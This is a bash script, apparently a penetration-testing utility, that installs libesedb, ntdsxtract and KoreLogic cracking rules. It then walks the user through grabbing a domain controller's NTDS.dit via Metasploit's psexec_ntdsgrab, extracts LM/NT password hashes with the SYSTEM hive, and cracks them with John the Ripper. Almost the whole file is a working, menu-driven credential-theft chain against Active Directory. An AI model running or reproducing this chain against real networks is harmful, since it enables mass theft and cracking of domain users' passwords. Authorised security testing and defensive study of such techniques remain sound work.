#!/bin/bash

#Date: 20-06-2019
#Author: BrandedCha0s
#Version: 1.1
#Tested on Windows Server 2012R2
#Youtube Channel: https://www.youtube.com/channel/UCV3YXm90Fqg-9l240y0AkyA

#Description: Makes a shadow copy, then extracts and cracks the locked NTDS.dit file from Domain controllers with John

#Variables
File=/root/libesedb-20181229/configure
File2=/root/ntdsxtract/dsusers.py
File3=/root/Downloads/korelogic-rules-20100801-reworked-all-3k.txt
libflag=false
ntdsflag=false
koreflag=false

Install_tools () {
  echo -e "\e[31m   ====================                             \e[0m"
  echo -e "\e[33m   **INSTALLING TOOLS**                             \e[0m"
  echo -e "\e[31m   ====================                             \e[0m"
  echo    "      Please Wait!!!"
  #Install latest version of libesedb
  if [ "$libflag" = false ]; then
  	wget https://github.com/libyal/libesedb/releases/download/20181229/libesedb-experimental-20181229.tar.gz &>/dev/null
  	 cp libesedb-experimental-20181229.tar.gz /root
      cd /root
  	   tar xfv libesedb-experimental-20181229.tar.gz &>/dev/null
  	    cd libesedb-20181229
  	   ./configure &>/dev/null
  echo    "      Keep Waiting!"
  	  make &>/dev/null
  echo    "     Almost There! :-)"
  	sudo make install &>/dev/null
  fi

  #Install ntdsxtract (AD forensic tool)
  if [ "$ntdsflag" = false ]; then
    cd /root
  	git clone https://github.com/csababarta/ntdsxtract.git &>/dev/null
  fi

  #Install Korelogic wordlist ruleset
  if [ "$koreflag" = false ]; then
  cd /root/Downloads
    echo "Korelogic install"
  	wget http://openwall.info/wiki/_media/john/korelogic-rules-20100801-reworked-all-3k.txt &>/dev/null
    cat korelogic-rules-20100801-reworked-all-3k.txt >> /etc/john/john.conf
    cd /root
  fi

  echo    "         Done!!!"
  sleep 1
}

ditpath=""
binpath=""

Extract_hashes () {
  #gnome-terminal -e msfconsole /root/ntdssetup.rc
  echo
  echo "In a new terminal open msfconsole and run auxiliary/admin/smb/psexec_ntdsgrab"
  #ToDo add msfconsole functionality
  echo
  echo "Be sure to fill in RHOSTS, SMBDomain, SMBUser, SMBPass and then run may have to be run twice"
  echo -e "\e[1;31m                ***HIT ENTER WHEN DONE***         \e[0m"
   read
    read -p "Copy and paste .dit filepath + filename here and hit enter: " ditpath
     read -p "Copy and paste .bin filepath + filename here and hit enter: " binpath
  echo -e "\e[31m    *****************                               \e[0m"
  echo -e "\e[1;31m    Extracting hashes                             \e[0m"
  echo -e "\e[31m    *****************                               \e[0m"
  #Debugging Only Remove Later
  #ditpath="/root/.msf4/loot/20190607225858_default_10.0.2.8_psexec.ntdsgrab._945517.dit"
  #binpath="/root/.msf4/loot/20190607225900_default_10.0.2.8_psexec.ntdsgrab._300159.bin"
  #
  cd /root/libesedb-20181229/esedbtools
   ./esedbexport -t /root/Desktop/ntds $ditpath
    cd /root/Desktop/ntds.export/
    mkdir extract
     python /root/ntdsxtract/dsusers.py datatable.4 link_table.7 extract/ --lmoutfile LM.out --ntoutfile NT.out --passwordhashes --pwdformat john --syshive $binpath &>/dev/null
      cd extract

  echo -e "\e[31m      ==================                            \e[0m"
  echo -e "\e[1;31m      Cracking with John                          \e[0m"
  echo -e "\e[31m      ==================                            \e[0m"
  sleep 2
  /usr/sbin/john --fork=2 NT.out

}

clear
#ASCII ART
echo -e "\e[34m           _   ____________  _____                      \e[0m"
echo -e "\e[34m          / | / /_  __/ __ \/ ___/                      \e[0m"
echo -e "\e[34m         /  |/ / / / / / / /\__ \                       \e[0m"
echo -e "\e[35m        / /|  / / / / /_/ /___/ /                       \e[0m"
echo -e "\e[35m       /_/ |||_||/ /__||_//____/          __            \e[0m"
echo -e "\e[35m          / ____/  __/ /__________ ______/ /_____  _____\e[0m"
echo -e "\e[36m         / __/ | |/_/ __/ ___/ __  / ___/ __/ __ \/ ___/\e[0m"
echo -e "\e[36m        / /____>  </ /_/ /  / /_/ / /__/ /_/ /_/ / /    \e[0m"
echo -e "\e[36m       /_____/_/|_|\__/_/   \__,_/\___/\__/\____/_/     \e[0m"

echo
echo
echo -e "\e[32mNTDS.dit Extraction Tool Installer, Extractor and Cracker\e[0m"
echo
echo -e "\e[32m       By: BrandedCha0s ============ Version: 1.1\e[0m"
echo

#Options Menu
PS3='Please enter your choice: '
options=("Install Tools" "Extract NTDS.dit" "Quit")
select opt in "${options[@]}"
do
    case $opt in
         "Install Tools")
         if [ -f "$File" ]; then
           echo "Libesedb Already Installed"
           libflag=true
         fi
         if [ -f "$File2" ]; then
            echo "ntdsxtract Already Installed"
            ntdsflag=true
         fi
         if [ -f "$File3" ]; then
            echo "Korelogic-rules Already Installed"
            koreflag=true
         fi
             Install_tools
             ;;
        "Extract NTDS.dit")
            Extract_hashes
            ;;
        "Quit")
            break
            ;;
        *) echo "Invalid Option $REPLY";;
    esac
done
